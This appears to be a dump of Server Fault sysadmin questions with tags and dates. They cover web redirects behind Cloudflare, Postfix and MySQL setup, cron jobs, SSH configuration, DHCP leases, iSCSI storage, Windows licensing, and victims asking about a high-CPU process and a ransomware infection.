<p>My requirement: As news editor uploads content in that news website, I want that to be written only in US server as it ultimately gets replicated to local server. To meet this requirement, I have configured htaccess in local server to redirect all request coming to /public_html/login or  /public_html/cms to US server. It's working. But as you know cloudfare has CDN features so request coming from my country or nearby my country will be redirected to my local server via cloudfare. Hence, I am facing too many redirection issues while browsing my newssite login page and cms page as I had configured redirection in .htaccess file (local server). Because editor hits newswebsite CMS page and they will be redirected to US server and again it will be redirected to local server, so there is a loop generated. (Geographical Location CDN)</p>

<p>How can I resolve this issue ? I think questions looks a bit messy but please try to understand. :-)</p>
","<.htaccess><website><mysql-replication><redirection><lsyncd>","2018-05-21 03:20:39"
"913069","Windows server as a domain controller but not DHCP and DNS server","<p>I want to integrate domain in my company. My colleague says he don't want windows server because it must become everything (DC, DHCP and DNS server). My question is can you have Widows Server only as a domain controller and not DHCP and DNS server?</p>
","<windows-server-2008><domain-controller>","2018-05-21 10:05:29"
"913184","Stuck at setting up Postfix correctly with my own list of domains","<p>I'm setting up Postfix + PostgreSql on FreeBsd to host my email server. I'm about 50% done. </p>

<p>I'm confused with several *.cf files and can't figure out which I should use for this.</p>

<p>I own several domains, say: domain1.com, domain2.com and domain3.com. </p>

<p>Where exactly should I specify these 3 domains? In what config file of Postfix? Thus my Postfix will only send through and receive emails for them?</p>
","<email><postfix><freebsd>","2018-05-22 04:43:12"
"913224",".resyslogd process is using 200% cpu","<p>First of all, a disclamer, I am not a sys admin, I was just asked to check why a VM of ours is using a lot of the cpu.<br>
It turns out that this process is running for ever on 200%<br>
<code>$top</code></p>

<blockquote>
  <p>PID &ensp;&ensp;USER  &nbsp;&nbsp;&ensp;  PR NI    VIRT    RES    SHR S  %CPU %MEM &ensp;   TIME+
  COMMAND<br>
  11058 www-data  20   0  269564   5812    384 S&ensp; 185.5 &ensp;&ensp;&ensp; 0.1 &ensp;2:42.95&ensp;&ensp; .resyslogd</p>
</blockquote>

<p>After some research I figured out that this is a logger (actually I found that the logger is the rsyslog but i gess r<strong>e</strong>syslog is the same thing.<br>
So i noticed that there are alot of connection attempts (from bots I am guessing) that was triggering the logger to write. So I decided to stop allowing passwords for loging in and switched to key authentication.
That did nothing for the cpu usage, even though the records on the logger where now less than before. for the random IPs that i was seeing on the logger, I added them on /etc/hosts.deny.<br>
After all these the cpu usage has not droped at all. the same process is using more than 100% of the cpu core.<br>
I know that the www-data is a web server, assuming apache, and dont know if it actually used for any reason.</p>

<p>Any help is highly appreciated.</p>
","<linux><cpu-usage><syslogd>","2018-05-22 10:28:58"
"840788","server capability, requirements","<p>Ok, I am new here. Sorry if Im posting in a wrong way.</p>

<p>I work in a school where most of the employee downloaded movies and stuff that used most of the bandwidth while we have <strong>a dedicated internet of 10M</strong>.</p>

<p>I am thinking of having a new PC with good hardware and install windows server 2012 OS.</p>

<p>The reason is that I need to control the users access to some website and block some apps. our network is peer to peer with 4 switches and 1 router.</p>

<p>I am surprised that there is no server at all.</p>

<p>My question is, will the server handle 100 users in our organisation? Please not we do not have any other applications, just normal users</p>

<p>In addition, i found out we have a UPS so I can use it for the server :)</p>

<p>Thank you all.</p>
","<installation><users>","2017-03-27 10:22:16"
"963693","Failed to start postgresql database","<p>Trying to setup Postgresql on Centos7 with WHM and CPANEL
Its installed fine but when I try to start it I get the following callback</p>

<pre><code>
-- Unit postgresql-9.5.service has begun starting up.
Apr 18 15:54:48 node1817.myfcloud.com pg_ctl[25929]: &lt; 2019-04-18 15:54:48.619 UTC &gt;LOG:  could not bind IPv6 socket: Address already in use
Apr 18 15:54:48 node1817.myfcloud.com pg_ctl[25929]: &lt; 2019-04-18 15:54:48.619 UTC &gt;HINT:  Is another postmaster already running on port 5432? If not, wait a
Apr 18 15:54:48 node1817.myfcloud.com pg_ctl[25929]: &lt; 2019-04-18 15:54:48.619 UTC &gt;LOG:  could not bind IPv4 socket: Address already in use
Apr 18 15:54:48 node1817.myfcloud.com pg_ctl[25929]: &lt; 2019-04-18 15:54:48.619 UTC &gt;HINT:  Is another postmaster already running on port 5432? If not, wait a
Apr 18 15:54:48 node1817.myfcloud.com pg_ctl[25929]: &lt; 2019-04-18 15:54:48.619 UTC &gt;WARNING:  could not create listen socket for ""localhost""
Apr 18 15:54:48 node1817.myfcloud.com pg_ctl[25929]: &lt; 2019-04-18 15:54:48.619 UTC &gt;FATAL:  could not create any TCP/IP sockets
Apr 18 15:54:49 node1817.myfcloud.com pg_ctl[25929]: pg_ctl: could not start server
Apr 18 15:54:49 node1817.myfcloud.com pg_ctl[25929]: Examine the log output.
Apr 18 15:54:49 node1817.myfcloud.com systemd[1]: postgresql-9.5.service: control process exited, code=exited status=1
Apr 18 15:54:49 node1817.myfcloud.com systemd[1]: Failed to start PostgreSQL 9.5 database server.
-- Subject: Unit postgresql-9.5.service has failed
-- Defined-By: systemd
-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel
--
-- Unit postgresql-9.5.service has failed.
</code></pre>

<p>Mysql is in running and I'm thinking that may be covering the ports. 
But I'm unsure of how to uninstall mysql, or free up the ports so that Postgresql can start up and use them.</p>
","<centos7><postgresql><port>","2019-04-18 16:22:25"
"1032129","Best approach for hosting 100s of WordPress sites on VPS","<p>I am looking to host 100s or maybe 1000s of isolated wordpress webistes (for development purpose) on a single VPS so what do you think will be the best approach to achieve this.</p>
<p>It will all be done using a single click button (Script) which will create a unique subdomain and install wordpress by copy-pasting the files and database. All of these sites will not have any traffic.</p>
<p>Now I am confused between using docker or v-hosts with apache or nginx. What do you think will use less resources and is best for the same purpose.</p>
<p><strong>NOTE:</strong> The sites will not have any traffic, so there is no concern about load balancing, uptime requirements, visitors, spikes and similar stuff. It will all be used for development purpose and sites will be deleted from time to time or maybe automatically after some time.</p>
<p>You can take a look at poopy.life (discontinued) and wpsandbox.org, the usecase will be similar to these but for my own customized usage.</p>
","<nginx><docker><virtualhost><wordpress><apache2>","2020-08-31 10:26:01"
"964213","How did my server get ransomeware","<p>I have a simple setup.  Email server,Web server IIS running on windows 2012.  The site is simple static with a contact form.  No uploading capability.</p>

<p>Today I found it was encrypted by ransomeware asking to pay to get all files back.  Luckily there was backups of most things so just reinstalled everything.</p>

<p>Just wondering how it might be possible for someone to attack such setup as no one has access to the machine, so I can say 100% no one clicked a link on the server itself.</p>

<p>The only thing that comes to mind is that someone hacked the admin account and put it on there.  Would this be a correct assumption.</p>
","<security><windows-server-2012-r2>","2019-04-23 12:31:25"
"1032637","Restart MySql Server using Service mysql status > /dev/null command not found","<p>Mysql server goes down in few days or weeks but at night. I tried search this forum and found this command</p>
<pre><code>*/5 * * * * service mysql status &gt; /dev/null || service mysql start
</code></pre>
<p>This check status in every five minute and if not work, It attempt to restart but I got email saying command not found like this in email</p>
<p><code>/bin/sh: service: command not found</code></p>
<p>I'm using</p>
<ul>
<li>CentOs7</li>
<li>CWP 7</li>
</ul>
<p>One more thing is when MySql is down I don't need to restart it, I just have to login to admin panel It shows error first then after refreshing everything works fine even MySql start again.</p>
<p><a href=""https://i.sstatic.net/DEKBW.jpg"" rel=""nofollow noreferrer"">Added Cron Command in CWP7</a></p>
","<mysql><centos7>","2020-09-04 04:40:14"
"913425","Can VLANs be used to segregate which devices on a Network get to the Internet?","<p>I have searched and read many posts on this site.  None of them directly addresses my problem.  I have several Linux boxes which I wish to have unfettered access to the Internet.  I have Windows machines which I do not want to have access to the Internet.  I do however want to use Samba shares on the Linux boxes from the Windows units.
  Is this feasible using VLANs?</p>
","<linux><windows><vlan>","2018-05-23 13:54:22"
"1032754","PermitRootLogin yes seems not to be working","<p>I need to SFTP with my IDE, that's why I set <code>PermitRootLogin yes</code> in sshd_config file. But it's not working I still need to sudo after logging in with password.
Here is my full settings file content:</p>
<pre><code>PermitRootLogin yes
PasswordAuthentication yes
KbdInteractiveAuthentication yes
AuthenticationMethods password
AllowUsers root
ChallengeResponseAuthentication no
UsePAM no
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
</code></pre>
<p>Any help would be much appreciated.
I'm using Ubuntu 18.04.2 LTS
After changes I restart ssh service, so that's not the issue.</p>
","<ubuntu><ssh><sftp><root>","2020-09-05 12:01:45"
"913558","Passwordless SSH Local Port forwarding","<p>I have setup <code>SSH Local Port forwarding</code> successfully with the below command</p>

<pre><code> ssh rex@server-001 -L 0.0.0.0:4122:node-x3:22
</code></pre>

<p>Now I am trying to do a passwordless access . For that I am using below command</p>

<pre><code> ssh -i /home/rex/.ssh/id_rsa rex@server-001 -L 0.0.0.0:4122:node-x3:22 
</code></pre>

<p>But it is asking or password. How to make passwordless work in Port forwarding. </p>
","<port-forwarding><ssh-tunnel><rhel6>","2018-05-24 05:43:06"
"913694","Hard Drive TVS Diode Repair Questions","<p>I have a Seagate drive that died that I would like to recover data off of. I diagnosed the drive as having a failed TVS diode so I removed the diode and the drive began to function again.</p>

<p>My concern is: I have to transfer a large amount of data off this drive that will take many hours to complete. During that time the drive will be running with no ESD protection on the 5v rail due to the missing TVS diode. </p>

<p>I have an old 5v voltage regulator board I made for a robotics project a long time ago. I was wondering if it would be beneficial to insert this board onto the +5v rail coming into the drive to take the place of the TVS diode. If that's not advised, is there anything else I could do to protect the drive during recovery?</p>

<p>Also, about how much over voltage does it take to fry the other components on the drive? Am I over-reacting to the drive not having ESD protection or is it absolutely critical to have?</p>
","<hard-drive><data-recovery>","2018-05-24 21:58:32"
"964694","Ethetnet PMC driver Selftest","<p>How to I convince an Ethernet driver to sent the data packet via an external cable, though the data packet is sent from IP 'A"" to IP 'A'?  The driver optimizes and does not take the route via an external cable. I need to either use Routing or low level functions of Vx-works 5.5(either TCP/IP or UDP) to solve the Ethernet PMC driver self-test problem. How can I implement these solutions??</p>
","<networking>","2019-04-26 08:24:27"
"964699","Add verification between Client and DDNS Server","<p>I'm new to networking and I have some questions want to ask.</p>

<p>A client site browser able to request from DDNS Server to obtain the website IP address that client want to redirect to, thus it helps client route to that specific website.</p>

<p>Is there any possibilities to add verification before client is authorized to request from DDNS Server? For example, username, password or even IP address.</p>
","<linux-networking>","2019-04-26 09:10:55"
"964712","Route specific port traffic through a VPN on Asus router","<p>I own a ac88u and would like to have a specific port on a specific machine within my network to always go through my VPN.
I can get an open VPN file to configure the router if need be.</p>
","<vpn><router><port><asus>","2019-04-26 10:37:02"
"913904","How to point phpmyadmin to same databases used in MySQL","<p>I installed mysql-server on Ubuntu 18.04 and then installed phpmyadmin. The issue I have now is when I do <code>show databases</code> in mysql, I get a different set of databases from what is shown in phpmyadmin.</p>

<p>How do I point phpmyadmin to the correct database?</p>
","<ubuntu><mysql><configuration><phpmyadmin>","2018-05-26 13:40:56"
"964890","MariaDB fail to start (NO_NEW_PRIVILEGES)","<p>I have a similar problem that here :</p>

<p><a href=""https://serverfault.com/questions/831503/why-wont-mariadb-start-after-upgrade-no-new-privileges"">Why won&#39;t MariaDB start after upgrade (NO_NEW_PRIVILEGES)</a></p>

<p>But I can't upgrade the kernel (this is a vps).</p>

<p>Does someone have an idea ?</p>
","<debian><configuration><systemd><selinux><mariadb>","2019-04-27 23:29:44"
"1033265","Differentiate between http requests sent manually and automatically","<p>By looking at the contents of a http request, is it possible to tell the difference between</p>
<p>A: http requests that have been manually sent by a user in a browser</p>
<p>and</p>
<p>B: http requests that have automatically been sent by a webpage (i.e. to obtain other resources).</p>
<p>What would be the best place to look?</p>
<p>Thanks</p>
","<https><http>","2020-09-09 18:14:26"
"965002","Ubuntu Server Cron Jobs not running","<p>iam about to blow up: i cant figure out why my jobs in the crontab -e file of any user are not running. None of them do so the ""last cron job is not running"" problem is not aplicable. Also i checked <a href=""https://serverfault.com/questions/449651/why-is-my-crontab-not-working-and-how-can-i-troubleshoot-it"">this</a> thread and couldn't find any mistakes. I even escaped my percent signs.</p>

<p>Here's my crontab -e file when running under the root user:</p>

<pre><code># Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# Minute Stunde TagIMonat Monat TagIWoche Kommando
# m h  dom mon dow   command
50 3 * */2 * /usr/bin/openssl pkcs12 -export -out /home/user/export.pfx -inkey /etc/letsencrypt/live/domain/privkey.pem -in /etc/letsencrypt/live/domain/chain.pem -password pass: blabla &gt; /var/log/cron.log
51 3 * */2 * /usr/bin/sshpass -p xxx scp /home/user/export.pfx root@255.255.255.255:/path/to/file/&gt; /var/log/cron.log
0 0 */5 * * /usr/bin/rsync -avx /var/www/nextcloud/apps /nextcloud/backup/path/nextcloud-apps_`date +""\%Y\%m\%d""`/ &gt; /var/log/cron.log
0 0 */5 * * /usr/bin/rsync -avx /var/www/nextcloud/config/config.php /nextcloud/backup/path/nextcloud-config_`date +""\%Y\%m\%d""`/ &gt; /var/log/cron.log
0 0 * * * /usr/bin/mysqldump --single-transaction -h localhost -u user -pPassword db &gt; /nextcloud/backup/path/nextcloud-sqlbkp_`date + ""\%Y\%m\%d""`.sql &gt; /var/log/cron.log
</code></pre>

<p>Maybe someone can help me with my problem.</p>

<p>Thanks</p>
","<linux><ubuntu><cron><escaping>","2019-04-28 22:47:32"
"1033462","How to make my server support SFTP?","<p>Hello I have a FTP server and some service we are working with (they are supposed to upload every day some files to our server) said they are only supporting SFTP :</p>
<p>1.is it a migration ? do I need to change/install something in my server to make this work ?</p>
<p>2.What will heppend to my files when I will make thoses changes ?</p>
<p>3.I already had an answer telling that we may need more info about my server, can you please tell me how to get you this info ?</p>
<p>Thanks !</p>
","<ftp><sftp>","2020-09-11 07:03:34"
"914310","Clear DHCP lease on disconnect","<p>I have a rather specific situation where i'm at a bit of a loss on how to do things properly so i figured it was time to ask for help.</p>

<p>Situation is: i have a Raspberry Pi with a 3G modem as well as hostapd and dnsmasq installed. This means that when i'm connected to the hotspot on the Pi i get internet access over 3G.</p>

<p>The setup is going to be used to provide internet access for a boombox to work together with a chromecast audio. Everything works fine and i can connect to the WiFi and play music from spotify - everthing is good. Almost.
The cell plan used in the modem is limited to a number of gigabytes - enough for music but not enough for people to forget to get off the wifi when they're not in charge of the music.</p>

<p>What i've done so far is put the Chromecast (and my own phone) on a static IP and set the DHCP scope to exactly 1 address This almost solves my problem except for the obvious design feature that the ip is reserved for the client for as long as the lease is valid. I could set a super short lease time, but that just makes for other problems with people hijacking the ip when trying to connect if someone's already connected.</p>

<p>Ideally what i want to do is clear the lease of a client as soon as it disconnects. Is this possible? Should i do something else? Have i already written too much for anyone to read everything?</p>

<p>I'm at a bit of a loss - what do i do?</p>
","<dhcp><wifi><dnsmasq><raspbian>","2018-05-29 17:59:04"
"914375","www-data run un-named process","<p>I have run a server with 2vcpu and 4 GB of ram. my software setup is apache2+php7.0+drupal-7. I'm facing 100% CPU utilization due to the un-named process called [] and is owned by www-data. (screenshot FYR). looking for solution..<a href=""https://i.sstatic.net/KHY4d.png"" rel=""nofollow noreferrer"">click to view top result image</a></p>
","<linux><cpu-usage>","2018-05-30 05:11:47"
"1033710","AD server OS upgrade","<p>we are going to upgrade OS from AD 2k8 R2 to 2k12 R2 but in our environment App servers are 2003/2008 as members of the domain. which are the points check before the upgrade?</p>
","<active-directory><upgrade>","2020-09-13 10:02:49"
"965473","MYSQL just using 1GB","<p>My System just uses 1GB of Ram but i get a lot of nginx 504 Errors and i guess mysql is the bottleneck </p>

<p>any hints welcome</p>

<p><a href=""https://i.sstatic.net/fxm1Y.png"" rel=""nofollow noreferrer"">htop output</a></p>
","<mysql><performance><database>","2019-05-01 20:05:28"
"914860","Does the DNS response order matter in nslookup?","<p>I've implemented a DNS relay program on Windows.<br>
I got 3 DNS query every <code>nslookup</code> command, PTR, A and AAAA.<br>
I reply the type=A query first, and reply PTR/AAAA query few microseconds later.<br>
But I got timeout in <code>nslookup</code> and found that every A and AAAA response are received by localhost but PTR response got ICMP <code>Port unreachable</code> error.<br>
I wonder why this happens?  </p>
","<windows><domain-name-system><nslookup>","2018-06-02 04:33:25"
"965586","Licensing multiple local Window guest VMs","<p>I have a client who needs their users to run multiple local Windows virtual machines on their laptops. Some users have 3-5 VMs, while others have 10+. I'm aware of the following two routes for licensing guest (desktop) operating systems:</p>

<ol>
<li>Purchase a retail/FPP license for each VM.</li>
<li>Purchase Software Assurance for the host, and leverage the virtualization rights.</li>
</ol>

<p>The second option works well for up to 4 (well, technically 3) VMs, but beyond that, are there any options aside from simply purchasing retail licenses for the remaining VMs?</p>

<p><a href=""https://i.sstatic.net/yOnef.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/yOnef.png"" alt=""Software Assurance Virtualization Rights Benefits""></a></p>

<p>I've considering working around this by purchasing a second Windows license for each host and then purchasing software assurance for that license, thus giving an additional 4 VMs via virtualization rights. From the Microsoft perspective, this is no different than if each employee simply had another laptop. Is this a valid strategy?</p>

<p>For context, VDI-like solutions are off the table here, as the users in question are frequently in remote locations with limited internet connectivity. They're also regularly remoting to other systems within those VMs, and I don't want to introduce another hop of latency into that equation.</p>

<p>Also for context, these VMs are, by Microsoft definition, production systems. Any solution involving MSDN or ""developer"" licenses isn't going to work here.</p>
","<windows><licensing>","2019-05-02 14:32:21"
"914888","Why do I receive [Errno 14] PYCURL ERROR 7 - ""couldn't connect to host"" when running yum commands in Red Hat Enterprise Linux and CentOS?","<p>When running <code>yum update</code>, the below error message occurs</p>

<blockquote>
  <p>Loaded plugins: product-id, rhnplugin, security
  redhat-rhn-satellite-5.5-server-x86_64-6                                                                                         | 1.6 kB     00:00<br>
  <a href=""https://cdn.redhat.com/content/dist/rhel/server/6/6Server/x86_64/cf-tools/1/os/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://cdn.redhat.com/content/dist/rhel/server/6/6Server/x86_64/cf-tools/1/os/repodata/repomd.xml</a>: [Errno 14] PYCURL ERROR 22 - ""The requested URL returned error: 403""
  Trying other mirror.
  <a href=""https://cdn.redhat.com/content/dist/rhel/server/6/6Server/x86_64/rhev-agent/3/os/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://cdn.redhat.com/content/dist/rhel/server/6/6Server/x86_64/rhev-agent/3/os/repodata/repomd.xml</a>: [Errno 14] PYCURL ERROR 22 - ""The requested URL returned error: 403""
  Trying other mirror.
  <a href=""https://cdn.redhat.com/content/dist/rhel/server/6/6Server/x86_64/os/repodata/repomd.xml"" rel=""nofollow noreferrer"">https://cdn.redhat.com/content/dist/rhel/server/6/6Server/x86_64/os/repodata/repomd.xml</a>: [Errno 14] PYCURL ERROR 22 - ""The requested URL returned error: 403""
  Trying other mirror.
  Error: failed to retrieve repodata/e847e0e8ad4903bd2acbbeea4eb487dbd3af3061a40b5a7f074f9e60709d49b7-updateinfo.xml.gz from redhat-rhn-satellite-5.5-server-x86_64-6
  error was [Errno 14] PYCURL ERROR 7 - ""couldn't connect to host""</p>
</blockquote>

<p>Yum fails with error</p>

<blockquote>
  <p>Error: failed to retrieve repodata/c964d1bced53b5fb02369d8429e2d2cd5a8699c6bab094b473f9e830afaa75a7-primary.xml.gz from rhel-x86_64-server-6
  error was [Errno 14] PYCURL ERROR 7 - ""couldn't connect to host""</p>
</blockquote>
","<centos><yum><update><rhel6><subscription>","2018-06-02 10:52:16"
"1033969","Best free software solution for homemade iSCSI SAN","<p>I currently have a NAS running ZFS on Ubuntu but have recently changed my main windows software to pool local drives using Stablebit DrivePool. I cannot include networked drives in DrivePool unless they are iSCSI and are presented to the windows 10 OS the same way physical disks are. I tried a workaroudn with windows shares mouted as virtual drives using Stablebit Cloud drive, but speed was terrible. I have two PCs with a total of 22 drives between them and would like to be able to pool all the drives together into one large virtual drive in DrivePool. Redundancy is taken care of by SnapRaid and folder level duplication to multiple drives for personal photos and videos.</p>
<p>I have two Emulex 12002 dual Fibre Channel HBA and would like to connect the two PCs together to present the drives from the secondary to the main windows PC so Drivepool and SnapRaid can work their magic. Where I'm stuck is the simplest, free software to attain this. I'm happy with Linux and BSD operating systems, but would also consider Windows 10/Server. Ideally I would like the SAN to not only present iSCSI drives but also be part of a docker swarm with the main windows PC.</p>
<p>Requirements:</p>
<ul>
<li>Main PC runs Windows 10 Pro with SnapRaid and StableBit DrivePool, pooling all storage to the equivilent of Raid5/RaidZ1 (1 drive failure) with additional folder level duplication to 2/3/4 physical drives for specific important files.</li>
<li>Both Main PC and Second PC will have an Emulex 12002 dual Fibre Channel HBA installed with an 8GBit fibre link. I need the iSCSI data sent via these rather than the 1GBit NIC. I do not intend to use a Fibre Channel switch, just a private link between the two PCs.</li>
<li>Second PC needs to present all drives (except boot SSD) as iSCSI drives to Main PC to work with DrivePool. I would prefer to present the raw drive (acting like passthrough) so the Main PC will manage partioning and fragmentation with an NTFS filesystem.</li>
<li>Second PC needs to be able to run docker as part of a docker swarm with Main PC</li>
<li>Second PC needs to be headless after initial setup with all management performed remotely through Main PC</li>
<li>With the iSCSI drives, I'll be able to upgrade SnapRaid to Raid6/Z2 equivilent or greater (2+ drive failures) and add additional pooled storage via DrivePool</li>
<li>I will not be running VMs, only docker for services so I do not want a hypervisor unless this is the easiest way to create an iSCSI target.</li>
</ul>
<p>Questions:</p>
<ul>
<li>Does iSCSI forward SMART information? Can Stablebit Drive Scanner work with them as though they were localally installed drives.</li>
<li>What is the simplest free (GPL/Open Source etc) OS / Software to use to achieve this? I won't consider a propriatory OS unless Windows Server 2019 is a good solution.</li>
<li>Can I make an iSCSI target function in the same way as a locally installed drive?</li>
<li>Is there a good linux equivilent of StableBit Scanner where SMART information is monitored and drive surfaces are periodically scanned?</li>
</ul>
<p>I've done a fair amount of googling, but most of the answers I've been finding are based on propriatory SAN hardware rather than the DIY solution I'm after. Help and suggestions very much appreciated! Once I have an idea of the best software/OS to use I'll be able to be much more specific with my google research.</p>
","<storage-area-network><iscsi><operating-system><fibre-channel>","2020-09-15 12:50:04"
"965646","DNS lookup local - how does it work?","<p>i have installed a server 2019 Active Directory with an DNS server.</p>

<p><a href=""https://i.sstatic.net/MKn4w.png"" rel=""nofollow noreferrer"">IP Configuration</a></p>

<p>You can see my DC is the DNS Server (192.168.190.10). 192.168.190.2 is my router.</p>

<p>My question: why is it possible to lookup websites with their DNS name? as example, i can browse to www.serverfault.com. </p>

<p>for my understanding, it shouldn't work because the router is the gateway. i am little bit confused...</p>
","<windows><domain-name-system>","2019-05-02 20:57:36"
"1034022","How can I mnually code a 301 redirection via nginx by adding HTTP fields without return and rewrite?","<p>I noticed that when I create a 301 redirection using nginx (rewrite, return 301), I get the following HTML body:</p>
<pre><code>&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>I would like to get rid of the HTML body of this 301 redirect generated by Nginx. Facebook and twitter got rid of those HTML bodies of their 301 redirect long time ago. It is a way to save some unsolicited bytes during 301 redirects.</p>
<p>So, I guess it is possible to create the HTTP header fields of the 301 redirect manually without calling rewrite or return 301. If I call &quot;rewrite&quot; or &quot;return 301&quot; in a location block of nginx, it will also generate the HTML body that  I don't want. I can't modify the configuration files because I use Plesk. The Nginx configuration files are automatically generated.</p>
<p>So, I guess it is possible to manually create the following HTTP header fields with NGINX in a location block:</p>
<pre><code>HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Tue, 15 Sep 2020 17:48:13 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: https://bloup.com/
</code></pre>
<p>How would you do it?</p>
","<nginx><301-redirect><plesk>","2020-09-15 18:03:46"
"915051","Concrete difference between faults and attacks","<p>I don't know if it is the good place to ask this question but I believe it is OK. My question is simple: how can one make a difference between a fault and between an attack? A denial of service could be cause by both, what may be considered as injection of data could be a device that is not working properly and so on. 
I see many recent papers about this topic, and they usually consider faults and attacks as the same thing. Do you guys have experience about this? Is it really possible to make a difference between an attack and a fault?</p>
","<security><fault-tolerance><attacks>","2018-06-04 08:23:08"
"915056","Protecting The Design Of A Word Template","<h1>Background</h1>

<p>I've designed a word template for a customer.  It has a large number of nested quick parts that speed up his document creation process.</p>

<p>He is concerned that some of his employees may take copies of this when they leave and take them to a competitor.  He needs each of his employees to be able to create new documents with the template and save them as pdf, but doesn't want them to be able to create copies of the template.</p>

<p>He has both on site windows servers with AD and also Office 365.</p>

<h1>Question</h1>

<p>What can I do to prevent people copying a <em>dotx</em> file, whilst also allowing them to use it to create new pdf documents? </p>
","<security><permissions><azure><microsoft-office-365>","2018-06-04 09:01:56"
"965796","Is it possible to receive mail on the internet without an MTA?","<p>I just need to be able to receive email on my Debian server, not send it.</p>

<p>How can I do this with the lowest memory/CPU footprint? Do I still need a full MTA?</p>
","<debian><email>","2019-05-03 19:37:11"
"1034173","Is OneDrive Personal safe for Intellectual Property?","<p>I am running a startup and I am just using my OneDrive personal for all my intellectual property.  Is this safe?  Couldn't a Microsoft employee just look in the files and take whatever they want?  Is it more secure, for this purpose, to use OneDrive for business?</p>
","<onedrive-for-business>","2020-09-16 19:56:47"
"915154","Cannot browse website from web server local network","<p>I have an web server where I have hosted my domains. Also I am using the same network to my home. But I can not see my domains from the same network. I have to use different internet service to access that. WHat should I do now? </p>
","<linux><domain-name-system><web-server>","2018-06-04 20:24:59"
"965870","Cloud instance start time comparison","<p>Is anyone keeping track of the performance of instance start times from the various cloud providers (AWS, Azure, GCP etc.)?</p>

<p>Obviously this will depend on a lot of factors e.g. instance type, instance availability, operating system, definition of 'availability' etc. so a matrix and quartiles would be awesome (e.g. 98% of m1-small's running amazon linux in AWS in eu-west-1 are available in 34 seconds).</p>

<p>The reason I'm asking: I have a workload that happens intermittently but when it's needed, latency (i.e. start up time) is important. For cost reasons I'd prefer if the instance(s) aren't running when not used.</p>

<p>Unfortunately lambda's / web functions etc. won't work for me (although I'll be using them to start the instance(s)).</p>
","<amazon-web-services><azure><google-cloud-platform><cloud>","2019-05-04 13:50:17"
"965963","Can Squid automatically add ETag?","<p>Can Squid automatically add ETag based on page content, for the client not to download the same page twice?</p>
","<proxy><squid><etags>","2019-05-05 19:07:45"
"841156","Partial hyphenated wildcard sub domain dns records","<p><strong>What are the correct DNS records for <code>{any}-the-sub.example.com</code>?</strong><br>
While avoiding  CNAME <code>*.example.com</code></p>

<p>For extended subdomain <code>{any}.the-sub.example.com</code> that would be something like:</p>

<pre><code>the-sub.example.com     A       0.0.0.0
*.the-sub.example.com   CNAME   the-sub.example.com
</code></pre>

<p>However same doesn't apply when using hyphen <code>{any}-the-sub.example.com</code>.
nor the <code>*-the-sub.example.com</code> or <code>*the-sub.example.com</code> wont work right?</p>
","<domain-name-system><subdomain><wildcard>","2017-03-28 23:27:20"
"841214","Any good open-source file recovery software for Windows?","<p>Is there any good (i.e., robust, effective, thorough, etc.) open-source file recovery software for Windows X out there? All I get after a google search is a bunch of paid software, of which probably 90% are scams or lie about being free up until the moment when you click ""Recover""! I'm wondering, since the open-source community has projects for all kinds of utilities, and doing a deep disk scan through unallocated space doesn't seem that complex of a task.</p>
","<windows><hard-drive><filesystems><data-recovery>","2017-03-29 07:33:37"
"966018","SSH after port change","<p>I changed the SSH port on my server, but I then forgot to open a hole in the firewall for that port specifically.<br>
Now I cannot SSH into my server anymore.
Is there any way around this?</p>

<p>Thanks</p>
","<ssh><firewall><port>","2019-05-06 09:06:38"
"1034551","Postfix not starting. How to resort to default settings?","<p>I just changed this &quot;Use TLS for SMTP connections&quot; and I turned inet_protocols = all to inet_protocols = ipv4 and then back to what it was.</p>
<p>Reloaded the configuration a couple of times.</p>
<p>Now, it won't start.</p>
<p>Please help. I am a layman just trying to set up my own email server.</p>
<p><strong>Ubuntu/Webmin/Virtualmin</strong></p>
","<ubuntu><webmin><virtualmin>","2020-09-19 15:03:12"
"841373","Can I access a Windows 2016 server from a 2012 client through a 2012 server?","<p>We have a bunch of thin clients with Server 2012 CALs. These thin clients mostly run RDP to a Windows 2012 server</p>

<p>We want to put a SQL Server 2016 install on a Windows 2016 server. These are all separately licensed.<br>
Programs running on the 2012 server will then access the SQL Server 2016 database running on the Windows 2016 server.</p>

<p>We have been informed that this will cause a licensing issue with Microsoft and that each of the thin clients will need to also have Server 2016 CALs in order to keep Microsoft happy.</p>

<p>This seems plausible but unnecessarily greedy, even for Microsoft.<br>
Does anyone have any information that will clarify this issue?</p>
","<windows><licensing><thin-client><cal>","2017-03-29 17:01:20"
"966242","Cant find much documentation regarding over committing of memory for VM's on a KVM host","<p>Most operating systems do not use 100% of the available RAM all the time, having said that I am unable to find an approximation for this over provisioning. CPU cores is not a constraint for me,</p>

<p>I have a 64 GB KVM host, I would like to provision multiple 8GB machines, the machines remain under utilized for most of the time but always in running state, I would like to know the maximum acceptable number of VM's that can be provisioned on this setup, without hitting any bottlenecks. The underlying storage is hard disk drives, with no SSD so there is little room for swap memory as it may impact performance</p>
","<virtualization><kvm-virtualization><qemu>","2019-05-07 18:33:00"
"966279","server listed in backscatterer twice in 2 months","<p>My server was listed twice in a 2 months time window in backscatterer.org blacklist, for a low severity.
I'm not finding anything about the reason of blacklisting.
Would there be anyone to help me to find the reason ?</p>

<p>I am on a Debian Jessie server using postfix with dovecot, protected with fail2ban on authentification attempts.
